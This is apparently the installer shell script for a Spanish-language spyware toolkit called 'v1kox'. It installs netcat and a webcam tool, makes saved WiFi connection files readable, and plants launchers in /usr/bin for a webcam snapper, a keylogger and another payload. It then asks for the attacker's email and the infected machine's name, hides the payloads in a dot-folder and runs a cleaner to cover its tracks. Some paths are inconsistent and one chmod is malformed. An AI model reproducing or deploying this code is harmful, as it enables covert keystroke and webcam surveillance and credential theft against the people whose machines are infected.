#!/bin/bash

root_verify=$(whoami)
usuario=$(users)

function init_program() {
    # Paquetes requeridos
    python3.7 -m pip install pyautogui pynput
    sudo apt-get install fswebcam netcat

    # Instalacion
    sudo chmod +r /etc/NetworkManager/system-connections/*

    sudo touch /usr/bin/observer.sh
    sudo touch /usr/bin/chisec.sh
    sudo touch /usr/bin/fingerstalker.sh
    #sudo touch /usr/bin/netinfo.sh
    sudo mv /exploits/bamby.sh /usr/bin
    sudo echo "python3.7 /home/$usuario/.v1kox/0v53rber/cam_snap.py" > /usr/bin/observer.sh
    sudo echo "python3.7 /home/$usuario/.v1kox/ch1s3c/hb.py" > /usr/bin/chisec.sh
    sudo echo "python3.7 /home/$usuario/.v1kox/f1ng3r5talk3r/keylogger.py" > /usr/bin/fingerstalker.sh
    #sudo echo "python3.7 /home/$usuario/.v1kox/n3t1nfo/netinfo.py" > /usr/bin/netinfo.sh
    sudo chmod +x /usr/bin/observer.sh
    sudo chmod +x /usr/bin/chisec.sh
    sudo chmod +x /usr/bin/fingerstalker.sh
    #sudo chmod +x /usr/bin/netinfo.sh
    sudo chmod +x /usr/bin/bamby.sh

    echo -e "Email Atacante >> "
    read email
    echo -e "Nombre de maquina infectada >> "
    read machine
    
    echo "$email|$machine|$usuario" > exploits/config.txt

    # Carpetas
    mkdir ../.v1kox
    mv exploits/cleaner.sh ../.v1kox && sudo chmod ../.v1kox/cleaner.sh
    mv exploits/config.txt ../.v1kox
    mv exploits/0v53rber/ ../.v1kox
    mv exploits/ch1s3c/ ../.v1kox
    mv exploits/f1ng3r5talk3r/ ../.v1kox
    mv exploits/n3t1nfo/ ../.v1k0x
    sudo mv exploits/config.txt /usr/bin/

    clear

    python3.7 /home/$usuario/v1k0x/add.py
    echo -e "[+] Instalacion completada con exito. "
    
    sudo ../.v1kox/./cleaner.sh $(pwd)
}

if [ $root_verify != "root" ]
then
    echo -e "[!] Debes ejecutar el instalador como root (super-usuario)"
else
    init_program
fi